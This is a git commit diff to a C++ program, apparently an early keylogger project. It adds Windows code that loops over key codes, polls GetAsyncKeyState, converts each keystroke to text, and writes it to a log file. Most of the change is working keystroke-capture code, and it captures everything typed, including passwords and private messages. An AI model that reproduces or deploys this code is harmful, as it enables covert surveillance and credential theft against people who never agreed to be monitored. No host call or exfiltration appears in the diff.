125eb2d2f7355f79ba26141ed8a56faa65024663
Victor Monteiro <victor.hms1206@gmail.com>
2025-09-22 16:02:49 -0300

    developing the code

--- main.cpp
+++ main.cpp
@@ -1,6 +1,7 @@
 #include <iostream>
 #include <fstream> //for working with files
 #include <string>
+#include <windows.h>
 using namespace std;
 
 void log(const string &text) {
@@ -12,6 +13,44 @@ void log(const string &text) {
     }
 }
 
-int main() {
+string keyToString(int key) {
+    if (key >= 'A' && key <= 'Z') {
+        return string(1, char(key));
+    }
+    switch (key) {
+        case VK_SPACE: return " ";
+        case VK_RETURN: return "\n";
+        case VK_BACK: return "[BACKSPACE]";
+        case VK_TAB: return "[TAB]";
+        case VK_SHIFT: return "[SHIFT]";
+        case VK_CONTROL: return "[CTRL]";
+        case VK_MENU: return "[ALT]";
+        case VK_ESCAPE: return "[ESC]";
+        case VK_LEFT: return "[LEFT]";
+        case VK_RIGHT: return "[RIGHT]";
+        case VK_UP: return "[UP]";
+        case VK_DOWN: return "[DOWN]";
+        case VK_DELETE: return "[DEL]";
+        default:
+            if (key >= '0' && key <= '9') {
+                return string(1, char(key));
+            } else {
+                return "[" + to_string(key) + "]";
+            }
+    }
+}
 
+int main() {
+    while (true) {
+        for (int key = 8; key<=190; key++) {
+            if (GetAsyncKeyState(key) & 0x0001) {
+                string keySTR = keyToString(key);
+                if(!keySTR.empty()) {
+                    log(keySTR);
+                }
+            }
+        }
+    }
+
+    return 0;
 }
